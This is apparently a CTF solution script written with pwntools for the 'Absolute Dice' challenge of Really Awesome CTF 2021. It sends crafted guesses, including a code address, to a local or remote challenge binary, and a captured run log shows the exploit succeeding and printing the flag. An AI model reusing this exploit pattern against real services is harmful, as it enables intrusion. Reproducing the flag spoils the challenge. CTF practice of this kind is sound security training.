from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './AbsoluteDice'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "193.57.159.27"
  PORT = 32511
  s = remote(HOST, PORT)
else:
  s = process(BINARY)

for i in range(31):
  s.sendlineafter("Enter your guess> ", "1")

s.sendlineafter("Enter your guess> ", str(0x8048BB9))

for i in range(31):
  s.sendlineafter("Enter your guess> ", "11")

s.interactive()

'''
mito@ubuntu:~/CTF/Really_Awesome_CTF_2021/Pwn_Absolute_Dice$ python solve.py r
[*] '/home/mito/CTF/Really_Awesome_CTF_2021/Pwn_Absolute_Dice/AbsoluteDice'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Opening connection to 193.57.159.27 on port 32511: Done
[*] Switching to interactive mode
Absolute Dice shrieks as your needle strikes a critical hit. (31/50)
Absolute Dice shrieks as you take her down with a final hit.ractf{Abs0lute_C0pe--Ju5t_T00_g00d_4t_th1S_g4me!}
Enter your guess> 
'''
